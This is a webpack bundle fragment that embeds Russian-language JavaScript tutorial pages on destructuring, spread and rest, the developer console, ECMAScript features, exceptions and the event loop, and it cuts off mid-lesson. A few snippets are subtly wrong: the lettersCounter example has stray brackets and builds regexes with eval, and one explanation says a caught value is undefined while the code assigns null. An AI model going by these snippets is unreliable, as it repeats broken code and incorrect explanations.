Math[func](deg)))(['sin', 'cos', 'tan', 'atan'])\nconsole.log(calcAngleData(Math.PI/3))\n~~~\n\n___________________________\n\n### ![ico-20 icon] Сортировка массива\n\nОбъявим массив чисел:\n\n~~~js\nconst array = [5, 1, 4, 9, 3, 8, 0]\n~~~\n\nВыполним следующий код:\n\n◘◘![ico-20 cap] 4◘◘\n\n~~~js\narray.forEach((item, index, arr) => {\n  let [current, prev] = [index, index]\n  while (--prev >= 0) {\n    if (arr[current] < arr[prev]) {\n      [arr[prev], arr[current]] = [arr[current], arr[prev]];\n      current = prev\n    }\n  }\n})\n~~~\n\nВ результате исходный массив array станет таким:\n\n~~~console\n[0, 1, 3, 4, 5, 8, 9]\n~~~\n\nТеперь изменим исходный массив:\n\n~~~js\nconst array = ['undefined', 'number', 'boolean', 'string', 'function', 'symbol', 'object']\n~~~\n\nи выполним тот же код\n\nВ результате исходный массив станет таким:\n\n~~~console\n[\"boolean\", \"function\", \"number\", \"object\", \"string\", \"symbol\", \"undefined\"]\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] Date()\n\n~~~js\nnew Date(...new Date().toLocaleDateString().split('.').reverse())\n~~~\n\nПредположим, в базе данных дата рождения юзера хранится в виде строки:\n\n~~~js\nuser.birthday = new Date(...).toLocaleDateString()\n~~~\n\nили:\n\n~~~js\nuser.birthday = '27.05.2001'\n~~~\n\nДля вычисления количества дней, оставшихся до дня рождения юзера, нужно эту строку опять превратить в объект класса ~Date~:\n\n~~~js\nconst userBirthday = new Date(...user.birthday.split('.').reverse())\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] Объекты\n\nЕсли мы деструктурируем объект, то переменные в левой части оператора присваивания будут перечисляться в **фигурных** скобках\n\n![ico-20 warn] При этом имена переменных должны совпадать с именами свойств объекта<br/>\n( порядок следования не имеет значения )\n\n◘◘![ico-20 cap] 5◘◘\n\n~~~js\nconst user = {\n  name: 'Georg',\n  role: 'admin',\n  stars: 5\n}\n\nconst { name, role, stars } = user\n\nconsole.info(name)   // \"Georg\"\nconsole.info(role)   // \"admin\"\nconsole.info(stars)  // 5\n~~~\n\n![ico-25 warn] Если при деструктуризации объекта переменные в левой части оператора присваивания были объявлены ранее, то все выражение нужно заключить в круглые скобки:\n\n~~~js\nlet name, age\n\n({ name, age } = { name: 'Ivan', age: 25 })\n~~~\n\nВ противном случае будет сгенерировано исключение\n\n~~~console\n⛔️ Uncaught SyntaxError: Unexpected token =\n~~~\n\n![ico-25 warn] Если мы хотим присвоить значение переменной с именем, отличающимся от имени свойства деструктурируемого объекта,\nто при перечислении имен свойств в левой части оператора присваивания через двоеточие можно указать новое имя переменной:\n\n◘◘![ico-20 cap] 6◘◘\n\n~~~js\nconst user = {\n  login: 'Ivan',\n  age: 42,\n  works: true\n}\n\nconst {\n  login: userName,\n  works: employed\n} = user\n\nconsole.log(userName)   // \"Ivan\"\nconsole.log(employed)   // true\n~~~\n\n![ico-25 warn] При деструктуризации объектов можно устанавливать значения переменных по умолчанию\n\n(на случай, если такого свойства в объекте нет)\n\n____________________________________________________________________\n\n◘◘![ico-20 cap] 7◘◘\n\n~~~js\nconst {\n  login = 'Сергей',\n  speciality = 'слесарь'\n} = { login: 'Ivan', age: 42 }\n\nconsole.log(login)       // \"Ivan\"\nconsole.log(speciality)  // \"слесарь\"\n~~~\n\n----------------------------------------------------------------------\n\n## ![ico-25 icon] Деструктуризация глубоких структур данных\n\n◘◘![ico-20 cap] 8◘◘\n\n~~~js\nconst humans = [\n  {\n    name: 'Stephan',\n    age: 38,\n    speciality: 'worker'\n  },\n  {\n    name: 'Mary',\n    age: 45,\n    speciality: 'teacher'\n  },\n  {\n    name: 'Peter',\n    age: 18,\n    speciality: 'student'\n  }\n]\n\nconst [, , { name, age, speciality }] = humans\n\nconsole.log(name, age, speciality)  // Peter 18 student\n~~~\n\n◘◘![ico-20 cap] 9◘◘\n\n~~~ js\nconst user = {\n  name: 'Peter',\n  age: 30,\n  hobby: ['football', 'fishing', 'sleeping'],\n  family: {\n    mother: {\n      name: 'Mary',\n      age: 55,\n      hobby: ['flowers', 'walks']\n    },\n    father: {\n      name: 'Joseph',\n      age: 60,\n      hobby: ['safari', 'run']\n    }\n  }\n}\n\nconst { hobby: [, , last] } = user\n\nconsole.log(last)  // sleeping\n\nconst { family: { mother } } = user\n\nconsole.log(mother) // { name: 'Mary', age: 55, hobby: Array(2) }\n\nconst { family: { mother: { name: motherName } } } = user\n\nconsole.log(motherName)  // Mary\n\nconst { family: { mother: { hobby: [, motherLastHobby] } } } = user\n\nconsole.log(motherLastHobby)  // walks\n~~~\n\n____________________________________________________________________\n\n\n## ![ico-25 icon] spread и rest (...)\n\nОператор **...** позволяет получить:\n• результат деструктуризации массива или объекта (spread)\n• остаток от дестуктурированного массива или объекта (rest)\n\n◘◘![ico-20 cap] 10◘◘\n\n~~~js\nconst getAngleData = deg => (['sin', 'cos', 'tan', 'atan'].map(func => Math[func](deg)))\n\nconst show = function () {\n  for (const arg of arguments) {\n    console.log(arg)\n  }\n}\n\nshow(...getAngleData(Math.PI/3))\n~~~\n\n~~~console\n0.8660254037844386\n0.5000000000000001\n1.7320508075688767\n0.808448792630022\n~~~\n\nМы использовали оператор ~spread~ для передачи аргументов функции ~show~\n\nТеперь получим остаток массива, возвращаемого функцией **~getAngleData~**, в массив **~rest30~**\nс помощью оператора ~rest~\n\n~~~js\nconst [sin30, ...rest30] = getAngleData(Math.PI/3)\n\nconsole.info(sin30)  // 0.8660254037844386\nconsole.log(rest30)\n~~~\n\n~~~console\n(3) [0.5000000000000001, 1.7320508075688767, 0.808448792630022]\n~~~\n\n_______________________________________\n\n### ![ico-20 icon] Оператор rest (...) в применении к объекту\n\n◘◘![ico-20 cap] 11◘◘\n\n~~~js\nconst user = {\n  name: 'Piter',\n  pass: 'xYc9-8a/bbb',\n  age: 25,\n  email: 'piter@gmail.com',\n  hobby: 'football'\n}\n~~~\n\n~~~js\nconst { pass, ...userWithoutPass } = user\n\nconsole.log(pass)   // xYc9-8a/bbb\nconsole.log (userWithoutPass)\n~~~\n\n~~~console\n▼ {name: \"Piter\", age: 25, email: \"piter@gmail.com\", hobby: \"football\"}\n    age: 25\n    email: \"piter@gmail.com\"\n    hobby: \"football\"\n    name: \"Piter\"\n  ► __proto__: Object\n~~~\n\n_______________________________________\n\n### ![ico-20 icon] Клонирование \"плоского\" массива\n\nМассивы (как и все объекты) передаются по ссылке,\nно иногда нужно клонировать массив,\nи в этом случае самый лаконичный способ - использовать конструктор **Array** для создания нового массива,\nно с элементами исходного экземпляра\nОператор spread ( ... ) позволяет сделать короткую запись при передаче элементов исходного массива конструктору:\n\n◘◘![ico-20 cap] 12◘◘\n\n~~~js\nconst array = [1, 2, 3, 4, 5]\n\nconst clone = new Array(...array)\n~~~\n\n![ico-20 warn] Однако следует помнить, что это не глубокое копирование,\nт.е. если элементами исходного массива являются объекты (массивы),\nто элементы клона будут ссылками на те же объекты (массивы)\n\n~~~js\nconst first = [1, 2, 3, 4, 5]\nconst second = [10, 20, 30]\n\nconst clone = new Array(...first, ...second)\n~~~\n\n___________________________\n\n## ![ico-20 icon] Immutability\n\nПредположим, у нас есть функция, возвращающая \"дефектную\" фунцию\n(с побочным эффектом - изменение данных внешнего окружения),\nкоторая получает массив в качестве аргумента\nи суммирует его элементы следующим образом:\n\n◘◘![ico-20 cap] 13◘◘\n\n~~~js\nconst numbers = [10, 5, 7]\nconst result = 0\n\nconst summation = () => {\n  let result = 0\n  return array => {\n    while (array.length) result += array.shift()\n    return result\n  }\n}\n~~~\n\nа мы не хотим, чтобы массив **numbers** опустошался после передачи ссылки на него в качестве аргумента,\nможно использовать оператор **~spread~** так:\n\n~~~js\nconsole.log((summation())([...numbers]))\nconsole.log(numbers)\nconsole.log(result)\n~~~\n\n____________________________________________________________\n\nДеструктурировать можно не только массивы, но любые **итерабельные** структуры данных\n\nДеструктурируем ~NodeList~ и ~HTMLCollection~\n\n◘◘![ico-20 cap] 14 (html)◘◘\n\n~~~html\n<body>\n  <p class=\"paragraph\">1</p>\n  <p class=\"paragraph\">2</p>\n  <p class=\"paragraph\">3</p>\n  <p class=\"paragraph\">4</p>\n</body>\n~~~\n\n◘◘![ico-20 cap] 14 (JS)◘◘\n\n~~~js\nconst [first, second, third, forth] = document.querySelectorAll('.paragraph')\n\nconsole.log(first)   // <p class=\"paragraph\">1</p>\nconsole.log(second)  // <p class=\"paragraph\">2</p>\nconsole.log(third)   // <p class=\"paragraph\">3</p>\nconsole.log(forth)   // <p class=\"paragraph\">4</p>\n~~~\n\n____________________________________________________________________\n\nПосмотрим, как с помощью деструктуризации можно сократь код:\n\nРазметка\n\n◘◘![ico-20 cap] 15 (html)◘◘\n\n~~~html\n<body>\n    <button id=\"registration\">Регистрация</button>\n    <button id=\"sign-in\">Вход</button>\n    <h3 id=\"title\">Hello</h3>\n    <div id=\"demo\">\n        <p>User name:</p>\n        <input id=\"name\"/>\n        <p>password:</p>\n        <input id=\"pass\" type=\"password\"/>\n        <button>Submit</button>\n    </div>\n</body>\n~~~\n\nПолучить элементы по **~id~**\n\n◘◘![ico-20 cap] 15 (JS)◘◘\n\n~~~js\nconst demo = document.getElementById('demo')\nconst btnReg = document.getElementById('registration')\nconst btnSignIn = document.getElementById('sign-in')\nconst nameElem = document.getElementById('name')\nconst passElem = document.getElementById('pass')\nconst title = document.getElementById('title')\n~~~\n\n◘◘Альтернативный вариант◘◘\n\n~~~js\nconst [demo, btnReg, btnSignIn, nameElem, passElem, title] = ['demo', 'registration', 'sign-in', 'name', 'pass', 'title']\n  .map(id => document.getElementById(id))\n~~~\n\n_______________________________________________________________________\n\nПосчитаем, сколько раз встречается каждый символ в строке\n\nРезультат поместим в объект, где имя каждого свойства будет буквой, а значение - числом, сколько раз этот символ встречается в строке ~str~\n\n◘◘![ico-20 cap] 16◘◘\n\n~~~js\nconst lettersCounter = str => Object.assign({}, ...str\n  .split('')\n  .map(letter => ({ [letter]: str.match(eval(`/${letter}/g`)).length })))\n}))\n\nlettersCounter('htkolkhlfottko')\n~~~\n\n**результат**\n\n~~~console\n▼ {h: 2, t: 3, k: 3, o: 3, l: 2, …}\n    f: 1\n    h: 2\n    k: 3\n    l: 2\n    o: 3\n    t: 3\n  ► __proto__: Object\n~~~\n\n___________________________________________________________________\n\n### ![ico-30 icon] Other samples\n\nЕсли любой объект сделать итерабельным, то к нему можно применять оператор ~spread~\n\n◘◘![ico-20 cap] 17◘◘\n\n~~~js\nfunction func (a, b, c) {\n  console.log(a + b + c)\n}\n\nconst user = {\n  a: 5,\n  b: 8,\n  c: 13,\n  [Symbol.iterator]: function* () {\n    for (const key of Object.keys(this)) yield this[key]\n  }\n}\n\nfunc(...user)   // 26\n~~~\n\n______________________________________________________________\n\n◘◘![ico-20 cap] 18◘◘\n\n~~~js\nconsole.log([...'012345'])\n~~~\n~~~console\n► (6) ['0', '1', '2', '3', '4', '5']\n~~~\n\n~~~js\nconsole.log({ ...'012345' })\n~~~\n~~~console\n► {0: '0', 1: '1', 2: '2', 3: '3', 4: '4', 5: '5'}\n~~~\n\n~~~js\nfunction func (a, b, c) {\n  console.log(a*1 + b*1 + c*1)\n}\n\nfunc(...'578')  // 20\n\n\nfunction test ({ a, b, c } = { a: 3, b: 4, c: 5 }) {\n  console.log(a + b + c)\n}\n\ntest()  // 12\n\ntest({ a: 5, b: 7, c: 8 })  // 20\n~~~\n\n_________________________\n\n### ![ico-30 hw] Упражнение\n\nЧто может вернуть следующий код (все варианты):\n\n~~~js\nfunction first () {\n  return Math.random() > 0.5 ? 'First' : ''\n}\n\nfunction second () {\n  return Math.random() < 0.5 ? 'second' : ''\n}\n\nsecond() || console.log(...[first(), second()])\n~~~\n\n_______________________________________________________________________________\n\n\n[![ico-25 hw] Quiz](quiz/destructuring)\n\n_______________________________________________________________________________\n"},29372:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Панель веб-разработчика\n\n_______________________________________________________________\n\n## ![ico-25] Консоль браузера\n\nДалее мы будем выполнять много упражнений непосредственно в консоли браузера\n\nКонсоль находится на вкладке **~Console~** в панели веб-разработчика\n\nКак открыть панель веб-разработки:\n\n~~~js\nCtrl + Shift + I  /* Chrome, Firefox, Opera */\n\nF12               /* IE */\n~~~\n\n![ico-20 warn] В Safari 5.1.7 все несколько сложнее\n\n^^Сначала откроем настройки и установим флажок Показывать меню \"**Разработка**\"^^\n\n!![illustrations/safari-menu.png, illustrations/safari-menu-1.png]\n\n^^После этого можно будет окрыть панель разработки с помощью  **~Alt + Ctrl + C~**^^\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Вывод в консоль\n\nТеперь можно выводить данные в консоль\n\n~~~js\nconsole.info('Hello')\nconsole.log('Bye', 'baby', 25)\nconsole.warn('Are you ready?')\nconsole.error('It\\'s wrong expression!')\n~~~\n\n![ico-25 smile] That's all!\n"},74424:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] ECMAScript\n\n![](illustrations/ecma-logo.jpg)\n\n**ES5** (2009)\n\n_______________________________________________________\n\n### [6th Edition / June 2015](https://262.ecma-international.org/6.0/)\n\n[![ico-20 link] features](https://www.w3schools.com/js/js_es6.asp)\n\n[![ico-20 link] Template literals](page/literals)\n[![ico-20 link] Вычисляемые имена свойств](page/calculated-prop-names)\n[![ico-20 link] Default Parameters](page/default-param-values)\n[![ico-20 link] Краткий синтаксис объявления методов](page/short-form-of-method-declaration)\n[![ico-20 link] String methods **includes**, **startsWith**, **endsWith**](page/String-methods)\n[![ico-20 link] Symbol](page/Symbol)\n![ico-20 pin] Map constructor\n![ico-20 pin] Set constructor\n[![ico-20 link] let & const](page/let-const)\n[![ico-20 link] Arrow functions](page/arrow-function)\n[![ico-20 link] Promise](page/promise)\n[![ico-20 link] Classes](page/Classes)\n[![ico-20 link] Destructuring](page/Destructuring)\n\n\n_______________________________________________________\n\n### [7ᵗʰ Edition / June 2016](https://262.ecma-international.org/7.0/)\n\n**Оператор возведения в степень**\n~~~js\na**b // то же, что и Math.pow(a, b) )\n~~~\n\n_______________________________________________________\n\n### ECMAScript 2017\n\n[![ico-20 link] async | await](page/async-await)\n\n[![ico-20 link] Array method **includes**](page/Array-methods#includes)\n[![ico-20 link] String methods **padStart** | **padEnd**](page/String-methods#padStart | padEnd)\n[![ico-20 link] Object.getOwnPropertyDescriptors](page/Object-static-props#Object.getOwnPropertyDescriptors)\n[![ico-20 link] Object.entries](page/Object-static-props#Object.entries)\n[![ico-20 link] Object.values](page/Object-static-props#Object.values)\n[![ico-20 link] Генераторы и итераторы](page/generators)\n\n_______________________________________________________\n\n### ECMAScript 2018\n\n_______________________________________________________\n\n### ECMAScript 2019\n\n[![ico-20 link] Dynamic import](page/dynamic-import)\n[![ico-20 link] BigInt](page/BigInt)\n[![ico-20 link] Symbol description](page/Syblol)\n"},9502:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Exceptions\n\nИсключения приводят к прерыванию выполнения текущей функции.\nОднако мы можем \"перехватывать\" исключения и не допускать прерывания выполнения кода.\n\nКогда мы \"перехватываем\" исключение, то мы получаем некий объект, который содержит описание того, что привело к генерации исключения.\n\nПрежде, чем перейти к перехвату исключений, разберемся с обектом ошибки (моделью исключения) и, соответственно, конструкторами, которые создают экземпляры ошибки.\n\n☼☼☼ Бачиш об'єкт? - шукай конструктор ☼☼☼\n\n## ![ico-30 icon] Конструкторы исключений\n\n### ![ico-20 icon] Error\n\nКонструктор **Error** создаёт кастомный объект **~Error~**.\n\n![](illustrations/Error-constructor.png)\n\n![ico-20 warn] ^^Конструктор **Error** может быть вызван без ключевого слова **~new~**.^^\n\nКонструктор принимает необязательный параметр - текст сообщения об ошибке\n^^(остальные опциональные параметры не были стандартизированы, и не поддерживаются браузерами).^^\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar err = new Error('Arguments are not valid')\nconsole.dir(err)\n~~~\n\n![](illustrations/Error-example-01.png)\n\nОднако мы можем добавлять свойства экземпляру конструктора **Error**.\n\n![ico-25 cap] ** 2**\n\n~~~js\nvar error = Object.assign(new Error('Hello'), {\n  fileName: 'figure',\n  lineNumber: 11,\n  stack: 'Welcome'\n})\n\nconsole.dir(error)\nconsole.error(error)\n~~~\n\n![](illustrations/Error-example-02.png)\n\n_________________\n\nМы уже знаем основные типы исключений, такие как ~SyntaxError~, ~ReferenceError~ and ~TypeError~.\nДля каждого типа исключения есть свой конструктор.\nОднако каждый конструктор конкретного типа исключения наследует от конструктора ~Error~.\n\n### ![ico-20 icon] SyntaxError\n\n![](illustrations/SyntaxError.png)\n\n![ico-25 cap] ** 3**\n\n~~~js\nconst syntaxError = Object.assign(new SyntaxError(), {\n  message: 'You should learn JS.',\n  name: 'Ignorant newbie Error.',\n  stack: 'Code execution failed.'\n})\n\nconsole.dir(syntaxError)\nconsole.error(syntaxError)\n~~~\n\n![](illustrations/SyntaxError-example-01.png)\n\n_________________________\n\n### ![ico-20 icon] ReferenceError\n\n![](illustrations/ReferenceError.png)\n\n![ico-25 cap] ** 4**\n\n~~~js\nconst referenceError = Object.assign(new ReferenceError(), {\n  message: 'We do not know such a person.',\n  name: 'Identification Error.',\n  stack: 'Search for person failed.'\n})\nconsole.dir(referenceError)\nconsole.error(referenceError)\n~~~\n\n![](illustrations/ReferenceError-example-01.png)\n________________________\n\n### ![ico-20 icon] TypeError\n\n![](illustrations/TypeError.png)\n\n![ico-25 cap] ** 5**\n\n~~~js\nconst typeError = Object.assign(new TypeError(), {\n  message: 'Invalid pincode',\n  name: 'Custom Error',\n  stack: 'Look here...'\n})\n\nconsole.dir(typeError)\nconsole.error(typeError)\n~~~\n\n![](illustrations/TypeError-example-01.png)\n\n____________________________\n\n## ![ico-30 icon] Оператор throw\n\nВы можете сами сгенерировать исключение с помощью оператора throw.\n\nОператор **~throw~** генерирует пользовательское исключение (ошибку).\n\nВыполнение текущей функции будет прервано, и управление будет передано в первый блок **_catch_** в стеке вызовов.\n\nЕсли блок **_catch_** отсутствует, выполнение программы завершится.\n\n![ico-25 cap] ** 6**\n\n~~~js\nconst syntaxError = Object.assign(new SyntaxError(), {\n  message: 'You should learn JS.',\n  name: 'Ignorant newbie Error.',\n  stack: 'Code execution failed.'\n})\n\nthrow syntaxError\n~~~\n\n![](illustrations/SyntaxError-example-02.png)\n\nКак видно из примера, результат в консоли будет тот же самый, что и в случае, когда мы выводим объект ошибки в консоль с помощью ~console.log~.\n\nТеперь, когда мы поняли, что из себя представляет экземпляр ошибки, как создавать пользовательские экземпляры ошибок, и как можно сгенерировать исключение, можно переходить к перехвату ошибок.\n\n________________________\n\n## ![ico-25 icon] try ... catch\n\nОператор   ~try ... catch~   позволяет перехватить исключения, возникающие в процессе выполнения кода.\n\n~~~js\ntry {\n  ...\n} catch (err) {\n  ...\n}\n~~~\n\nЕсли при выполнении кода в блоке  **~try { ... }~**  возникнет ошибка, управление перейдет в блок  **~catch~** с передачей в качестве аргумента объекта ошибки.\n\n![ico-25 cap] ** 7**\n\n~~~js\nvar obj = null\n\ntry {\n  var x = obj.name\n} catch (err) {\n  var x = null\n}\n~~~\n\nВ этом примере при выполнении кода\n\n~~~js\nvar x = obj.name\n~~~\n\nдолжно быть сгенерировано исключение, которое приведет к прерыванию работы программы.\n\nБлагодаря тому, что исключение \"перехватывается\" в блоке **_try_**, управление переходит в блок **_catch_**, где переменной  ** x ** присваивается значение **~undefined~**, и работа программы продолжается.\n\n__________________________________\n\n![ico-25 cap] ** 8**\n\n~~~js\nfunction outerFunc () {\n  return innerFunc()\n}\n\nfunction innerFunc () {\n  try {\n    return sample()\n  } catch (err) {\n    console.group(err.name)\n    console.warn(err.message)\n    console.groupEnd(err.name)\n    return err.name === 'ReferenceError' ? 1 : 2\n  }\n}\n\nconsole.log('Result:', outerFunc())\n~~~\n\n![](illustrations/Error-example-reference-error-01.png)\n\n![ico-25 cap] ** 9**\n\n~~~js\nsample = 5\n\nfunction outerFunc () {\n  return innerFunc()\n}\n\nfunction innerFunc () {\n  try {\n    return sample()\n  } catch (err) {\n    console.group(err.name)\n    console.warn(err.message)\n    console.groupEnd(err.name)\n    return err.name === 'ReferenceError' ? 1 : 2\n  }\n}\n\nconsole.log('Result:', outerFunc())\n~~~\n\n![](illustrations/Error-example-type-error-01.png)\n\n_________________________\n\n\n^^^[ES 2019]\n\nС 2019 года в блок **_catch_** не обязательно передавать аргумент:\n\n~~~js\nvar obj = null\n\ntry {\n  var x = obj.name\n} catch {\n  x = null\n}\n~~~\n\n^^^\n\n### ![ico-20 icon] finally\n\nЭтот блок кода отработает назависимо от того, чем завершился `try...catch`\n\n![ico-25 cap] **10**\n\n~~~js\ntry {\n  throw({\n    name: 'Hi',\n    message: 'It\\'s a joke',\n    stack: `\n      Hello,\n      sorry for the interruption,\n      I really wanted to say hello 😉\n    `\n  })\n} catch (err) {\n    console.error(err.stack)\n} finally {\n   console.info('try...catch completed')\n}\n~~~\n\n![](illustrations/try-catch-finally-01.png)\n\n____________________________\n![ico-25 cap] **11**\n\nВ результате выполнения кода:\n\n~~~js\ntry {\n  throw new Error('Arguments not valid')\n} catch (err) {\n  console.error(`${err.name}: ${err.message}`)\n}\n~~~\n\nв консоль будет выброшено исключение:\n\n••![ico-20 error] Error: Arguments not valid••\n\n____________________________\n\n![ico-25 cap] **12**\n\n~~~js\nvar num = {}\n\ntry {\n  if (typeof num !== 'number') {\n    var err = new Error('Arguments not valid')\n    err.name = 'ValidationError'\n    throw err\n  }\n} catch (err) {\n  console.error(`${err.name}: ${err.message}`)\n}\n\nconsole.dir(err)\n~~~\n\n![](illustrations/Error-example-12.png)\n\n_________________\n\n![ico-25 cap] **13**\n\n~~~js\ntry {\n  throw({ name: 'Hi', message: 'It\\'s a joke' } )\n} catch (err) {\n  console.log(err.name, err.message)\n}\n~~~\n\n_________________\n\n![ico-25 cap] **14**\n\n~~~js\ntry {\n  throw({\n    name: 'Hi',\n    message: 'It\\'s a joke',\n    stack: `\n      Привет,\n      извините за вмешательство,\n      очень хотелось поздороваться 😉\n    `\n  })\n} catch (err) { console.error(err.stack) }\n\n~~~\n\n_________________________\n\n## AggregateError\n\n![ico-25 cap] **15**\n\n~~~js\nconst array = [5, 'hero', false, 9, { type: 0 }, [], 11, 34.5, 8.5, 77]\n\nfunction parseArray (array, errors = []) {\n  if (!Array.isArray(array)) {\n    errors.push(new TypeError('Argument should be an array'))\n    return errors\n  }\n  const name = 'Parse Array Error'\n  array.forEach((item, index) => !Number.isInteger(item) &&\n    errors\n      .push(Object.assign(new SyntaxError(), { name, stack: `Array element ${index} is not an integer.` })))\n  return errors\n}\n\nconst aggregatedError = new AggregateError(parseArray(array))\n\nObject.assign(aggregatedError, {\n  stack: 'Parse Array Errors:\\n' + aggregatedError.errors.map(err => '    ' + err.stack).join('\\n')\n})\n\nthrow aggregatedError\n~~~\n\n![](illustrations/AggregateError-example-01.png)\n\n__________________________________\n\n[![ico-30 hw] **Упражнения**](test/exclusions)\n"},90715:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 icon] Event Loop\n\n## ![ico-25 icon] Базовые понятия\n\n![ico-20 pin] **Процесс** — это экземпляр исполняемой программы, которому выделены системные ресурсы (время процессора и память).\n\n![ico-20 pin] **Поток** (thread) — это последовательность команд (операторов языка, вызовов функций и т.д.), которые выполняются последовательно друг за другом.\n\nНесколько потоков могут существовать в рамках одного и того же процесса и совместно использовать ресурсы (память).\n\n^^^[Процесс и поток]\n^^![ico-20 warn] Каждый процесс выполняется в отдельном адресном пространстве.^^\n^^![ico-20 warn] Один процесс не может получить доступ к данным другого процесса.^^\n^^![ico-20 warn] Каждая программа создает по меньшей мере один основной поток, который запускает функцию **~main()~**.^^\n^^![ico-20 warn] Программа, использующая только основной поток, является **_однопоточной_**.^^\n\n^^Многопоточные языки используют несколько потоков.^^\n\n^^В многопроцессорных (многоядерных) системах каждый процессор (ядро) обслуживает отдельный поток, поэтому потоки действительно выполняются параллельно (одновременно).^^\n\n^^При наличии только одного процессора ему приходится довольно часто переключаться с одного потока на другой, чтобы создать иллюзию одновременного выполнения кода во всех потоках.^^\n\n^^^\n\n**Стек** — это "быстрый" кусок оперативной памяти.\n\n^^^[Stack]\n^^Стек создаётся _для каждого потока_ в многопоточных языках.^^\n^^Стек организован по принципу LIFO (последним пришел - первым ушел).^^\n^^Размер стека ограничен.^^\n^^Он задаётся при создании потока.^^\n^^Переменные, находящиеся в стеке, всегда являются _локальными_ (**приватными**).^^\n^^^\n\n**Heap** ("куча") — это оперативная память, где хранятся глобальные переменные.\n\n^^^[Heap]\n^^"Куча" допускает динамическое выделение памяти.^^\n\n^^Доступ к данным, хранящимся в "куче", обеспечивается посредством ссылок - переменных, значения которых являются адресами других переменных.^^\n\n^^Поэтому "куча" работает медленнее, чем стек.^^\n\n^^Процессор не контролирует "кучу" (в отличие от стека), поэтому для освобождения памяти "кучи" от ненужных переменных требуются  "сборщики мусора".^^\n^^^\n\n![ico-25 warn] JS однопоточный язык, поэтому у нас только один стек (**~Call Stack~**).\n\n____________________________________\n\n## ![ico-25 icon] Асинхронщина\n\n☼☼☼ Асинхронщина - это господство событий ☼☼☼\n\nОдно из главных свойств событий - время их наступления непредсказуемо.\n\nЧто невозможно предсказать, то невозможно синхронизировать.\n\nМы не знаем заранее, когда пользователь кликнет на кнопке, и клинет ли вообще.\nПосылая запрос на сервер, мы не можем предсказать, через сколько миллисекунд мы получим ответ сервера.\n\nВторое свойство большинства событий - результат наступления события недетерминирован.\n\n@@@@\nМы не можем с уверенностью предсказать, будет ли статус ответа сервера успешым, или же сервер вернет нам код http-ошибки.\n![](illustrations/async-fynny-02.gif)\n@@@@\n\nЕсли мы не можем управлять событиями, то мы можем дать событиям управлять нашим кодом.\n\n## ![ico-25 icon] Event-Driven Programming\n\nАсинхронное программирование - это привязка функций к определенным событиям.\nЭто так называемое событийно-ориентированное прораммирование (**Event-Driven Programming**).\n\nПонятное дело, что в той среде (платформе), где будет работать ваше приложение, должен быть механизм, который обеспечивает реакцию на события.\nТ.е такой механизм должен предоставить вашему приложению некий **Event API** (<b>A</b>pplication <b>P</b>rogramme <b>I</b>nterface), сервисы которого позволят привязать ваши функции к определенным событиям.\nЭтот же механизм должен обеспечить запуск на исполнение ваших функций при наступлении соответствующего события.\n\nВ браузере такой механизм есть, и называется он **Event Loop**.\n\n**_Event Loop_** - это бесконечный цикл выполнения задач.\n\n[%%%MDN%%%](external/mdn-event-loop)\n\n________________________________________\n\n## ![ico-25 icon] Callback\n\n![ico-20 warn] **В JS исполняются только функции**.\nДля исполнения скрипта сначала нужно создать контекст выполнения, который будет помещен в **стек вызовов**.\nПоэтому он и называется **стек вызовов** (**Call Stack**).\nА что можно вызвать? - только **функцию**.\n\n@@@@ 1\n![](illustrations/event-loop-01.png)\n@@@@\n\nЕсть два способа вызвать функцию: это **прямой вызов** и **обратный вызов**.\n\n**Прямой вызов** - когда функцию вызывают по имени из того скрипта, который исполняется в данный момент.\n\nИсполняется - значит, какой-то скрипт уже "сидит" в **Call Stack**.\nОн может сделать прямой вызов любой другой функции.\nНо как он сам попал в **Call Stack**?\n\n![ico-20 yes] Первым в Call Stack всегда попадает **callback** - _функция обратного вызова_.\n\n**Callback** - это функция, привязанная к событию, которая попадет в стек вызовов через механизм **Event Loop**.\n\n@@@@ 1\n![](illustrations/event-loop-script.png)\n@@@@\n\n^^Здесь скрипт сниппета был "завернут" в некую функцию **~anonimous~**, привязан к событию "запустить скрипт ~anonimous~", после чего это событие было инициировано.^^\n^^В результате скрипт **~anonimous~** "оккупировал" Call Stack и начал исполняться.^^\n^^Функция **~anonimous~** стала колбеком и прошла через **Event Loop**.^^\n^^Теперь **~anonimous~** из стека вызовов может осуществлять **прямой вызов** других функций.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-02.png)\n@@@@\n\n^^Функция **parent** была вызвана из скрипта **anonimous**. Это **прямой вызов**.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-03.png)\n@@@@\n\n^^Функция **demo** была вызвана из скрипта **parent**. Это **прямой вызов**.^^\n\n^^Как мы видим, все они одновременно "сидят" в стеке вызовов.^^\n^^Сверху всегда находится функция, которая исполняется в данный момент.^^\n^^Функция **parent** и функция **demo** попали в стек вызовов по непосредственному "приглашению" от скрипта **anonimous**.^^\n_________________________________________________\n\nНо у нас есть еще одна - анонимная - функция, которую мы назначили обработчиком события **~click~** элемента ~document.body~.\nЭта функция по определению является функцией обратного вызова (**callback**).\nЗаметим, что колбеку имя не нужно. Обычно это анонимная функция.\nОн привязан к событию.\nЕго может запустить на исполнение только механизм **Event Loop**.\nЕсли это событие произойдет, то она получит шанс попасть в стек вызовов.\nОднако тут придётся постоять в очереди, потому что событий много, и коллбеки, связанные с ними, образуют очередь задач (**task queue**).\n\n@@@@ 1\n![](illustrations/event-loop-04.png)\n@@@@\n\nИтак, мы видим, что первым в **Call Stack** всегда попадает колбек.\nИ, находясь в стеке вызовов, он может вызывать другие функции.\nИ каждая вызванная им функция будет одновременно с ним стеке вызовов.\n\n@@@@ 1\n![](illustrations/event-loop-05.png)\n@@@@\n\nЭта функция может вызвать другую функцию, контекст исполнения которой также появится в стеке вызовов.\nТак они будут там образовывать "слоеный пирог".\nФункция, вызванная последней, будет в стеке вызовов сверху.\nОна же первая покинет **Call Stack**.\n\n@@@@ 1\n![](illustrations/event-loop-06.png)\n@@@@\n\nПоследним покинет стек вызовов колбек, который и породил всю эту пирамиду.\nОбратите внимание, что каждый колбек занимает наш единственный **Call Stack** до тех пор, пока весь его код не будет 